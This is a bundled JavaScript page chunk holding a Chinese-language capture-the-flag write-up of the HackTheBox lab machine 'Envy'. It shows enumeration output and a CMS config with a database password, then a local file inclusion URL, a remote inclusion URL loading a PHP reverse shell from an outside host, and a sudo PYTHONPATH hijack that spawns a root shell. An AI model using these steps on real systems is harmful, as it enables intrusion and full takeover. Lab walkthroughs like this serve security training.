"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[9738],{51959:(n,e,t)=>{t.r(e),t.d(e,{assets:()=>o,contentTitle:()=>p,default:()=>d,frontMatter:()=>r,metadata:()=>s,toc:()=>c});const s=JSON.parse('{"id":"HackTheBox/Battlegrounds/Cyber Mayhem/Envy","title":"Envy","description":"\u4fe1\u606f\u6536\u96c6","source":"@site/docs/HackTheBox/Battlegrounds/Cyber Mayhem/Envy.md","sourceDirName":"HackTheBox/Battlegrounds/Cyber Mayhem","slug":"/HackTheBox/Battlegrounds/Cyber Mayhem/Envy","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Battlegrounds/Cyber Mayhem/Envy","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Battlegrounds/Cyber Mayhem/Envy.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackTheBox_Sidebar","previous":{"title":"Emilie","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Battlegrounds/Cyber Mayhem/Emilie"},"next":{"title":"Grapple","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Battlegrounds/Cyber Mayhem/Grapple"}}');var i=t(74848),a=t(28453);const r={},p="Envy",o={},c=[{value:"\u4fe1\u606f\u6536\u96c6",id:"\u4fe1\u606f\u6536\u96c6",level:2},{value:"http 80 \u76ee\u5f55\u626b\u63cf",id:"http-80-\u76ee\u5f55\u626b\u63cf",level:2},{value:"http 8080 \u76ee\u5f55\u626b\u63cf",id:"http-8080-\u76ee\u5f55\u626b\u63cf",level:2},{value:"http 80 cms config",id:"http-80-cms-config",level:2},{value:"Port 8080 LFI",id:"port-8080-lfi",level:2},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:2}];function l(n){const e={code:"code",h1:"h1",h2:"h2",header:"header",p:"p",pre:"pre",...(0,a.R)(),...n.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(e.header,{children:(0,i.jsx)(e.h1,{id:"envy",children:"Envy"})}),"\n",(0,i.jsx)(e.h2,{id:"\u4fe1\u606f\u6536\u96c6",children:"\u4fe1\u606f\u6536\u96c6"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:'Detected ss and lsof, executing related commands...\nPort: 53, PID: 720\n\u2014> Command: /lib/systemd/systemd-resolved \nPort: 22, PID: 923\n\u2014> Command: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups \nPort: 33060, PID: 1069\n\u2014> Command: /usr/sbin/mysqld \nPort: 3306, PID: 1069\n\u2014> Command: /usr/sbin/mysqld \n\n## \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014 ##\n\nNginx is not installed.\n\n## \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014 ##\n\nDetected apache, analyzing its configuration...\nDevice "eth0" does not exist.\n\nUnique Hosts:\n\n\n## \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014 ##\n\nChecking /etc/sudoers (active configurations only):\n  Defaults      env_reset\n  Defaults      mail_badpass\n  Defaults      secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"\n  root  ALL=(ALL:ALL) ALL\n  www-data ALL=(ALL:ALL) NOPASSWD:SETENV:/usr/bin/python* /opt/time_check.py\n  %admin ALL=(ALL) ALL\n  %sudo ALL=(ALL:ALL) ALL\n\u2014\u2014\u2014\nFinding SUID files:\n  root  ALL=(ALL:ALL) ALL\n  www-data ALL=(ALL:ALL) NOPASSWD:SETENV:/usr/bin/python* /opt/time_check.py\n  %admin ALL=(ALL) ALL\n  %sudo ALL=(ALL:ALL) ALL\n\u2014\u2014\u2014\nFinding files with special capabilities:\n  /snap/core20/1376/usr/bin/ping = cap_net_raw+ep\n  /snap/core20/1405/usr/bin/ping = cap_net_raw+ep\n  /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep\n  /usr/bin/ping = cap_net_raw+ep\n  /usr/bin/mtr-packet = cap_net_raw+ep\n  /usr/bin/traceroute6.iputils = cap_net_raw+ep\n\u2014\u2014\u2014\n'})}),"\n",(0,i.jsx)(e.h2,{id:"http-80-\u76ee\u5f55\u626b\u63cf",children:"http 80 \u76ee\u5f55\u626b\u63cf"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-plaintext",children:"[12:13:32] 301 -  314B  - /admin  ->  http://10.10.110.101/admin/\n[12:13:33] 302 -    0B  - /admin/  ->  http://10.10.110.101/admin/login.php\n[12:13:33] 302 -    0B  - /admin/?/login  ->  http://10.10.110.101/admin/login.php\n[12:13:33] 302 -    0B  - /admin/index.php  ->  http://10.10.110.101/admin/login.php\n[12:13:34] 200 -    4KB - /admin/login.php\n[12:13:46] 200 -    2KB - /assets/\n[12:13:46] 301 -  315B  - /assets  ->  http://10.10.110.101/assets/\n[12:13:53] 200 -    0B  - /config.php\n[12:13:58] 200 -   24B  - /doc/\n[12:13:58] 301 -  312B  - /doc  ->  http://10.10.110.101/doc/\n[12:14:07] 200 -   19KB - /index.php\n[12:14:10] 301 -  312B  - /lib  ->  http://10.10.110.101/lib/\n[12:14:10] 200 -   24B  - /lib/\n[12:14:15] 301 -  316B  - /modules  ->  http://10.10.110.101/modules/\n[12:14:15] 200 -    3KB - /modules/\n[12:14:27] 403 -  278B  - /server-status/\n[12:14:27] 403 -  278B  - /server-status\n[12:14:34] 301 -  312B  - /tmp  ->  http://10.10.110.101/tmp/\n[12:14:34] 200 -    1KB - /tmp/\n[12:14:36] 301 -  316B  - /uploads  ->  http://10.10.110.101/uploads/\n[12:14:36] 200 -    0B  - /uploads/\n"})}),"\n",(0,i.jsx)(e.h2,{id:"http-8080-\u76ee\u5f55\u626b\u63cf",children:"http 8080 \u76ee\u5f55\u626b\u63cf"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-plaintext",children:"[12:10:18] 200 -    1KB - /LICENSE.txt\n[12:10:24] 200 -   22KB - /about.html\n[12:10:49] 200 -   14KB - /contact.html\n[12:10:50] 301 -  319B  - /css  ->  http://10.10.110.101:8080/css/\n[12:11:00] 301 -  319B  - /img  ->  http://10.10.110.101:8080/img/\n[12:11:01] 302 -    0B  - /index.php  ->  index.php?page=index.html\n[12:11:01] 302 -    0B  - /index.php/login/  ->  index.php?page=index.html\n[12:11:02] 200 -   46KB - /index.html\n[12:11:03] 200 -  931B  - /js/\n[12:11:04] 301 -  319B  - /lib  ->  http://10.10.110.101:8080/lib/\n[12:11:04] 200 -    2KB - /lib/\n[12:11:07] 301 -  320B  - /mail  ->  http://10.10.110.101:8080/mail/\n[12:11:07] 200 -    1KB - /mail/\n"})}),"\n",(0,i.jsx)(e.h2,{id:"http-80-cms-config",children:"http 80 cms config"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"<?php\n# CMS Made Simple Configuration File\n# Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference\n#\n$config['dbms'] = 'mysqli';\n$config['db_hostname'] = 'localhost';\n$config['db_username'] = 'db_admin';\n$config['db_password'] = 'ThisIsAVerySecurePassword123!';\n$config['db_name'] = 'cmsms';\n$config['db_prefix'] = 'cms_';\n$config['timezone'] = 'UTC';\n?>\n"})}),"\n",(0,i.jsx)(e.h2,{id:"port-8080-lfi",children:"Port 8080 LFI"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-plaintext",children:"http://10.10.110.102:8080/index.php?page=../../../../opt/flag.txt\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u987a\u4fbf\u5305\u542b\u4e00\u4e2a webshell \u4e0a\u53bb\u5c31\u80fd rce"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-plaintext",children:"http://10.10.110.102:8080/index.php?page=http://10.10.10.10/php-reverse-shell.php \n"})}),"\n",(0,i.jsx)(e.h2,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:'touch /tmp/datetime.py\necho "import pty" >> /tmp/datetime.py\necho \'pty.spawn("/bin/bash")\' >> /tmp/datetime.py\nsudo PYTHONPATH=/tmp /usr/bin/python3 /opt/time_check.py\n'})})]})}function d(n={}){const{wrapper:e}={...(0,a.R)(),...n.components};return e?(0,i.jsx)(e,{...n,children:(0,i.jsx)(l,{...n})}):l(n)}},28453:(n,e,t)=>{t.d(e,{R:()=>r,x:()=>p});var s=t(96540);const i={},a=s.createContext(i);function r(n){const e=s.useContext(a);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function p(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(i):n.components||i:r(n.components),s.createElement(a.Provider,{value:e},n.children)}}}]);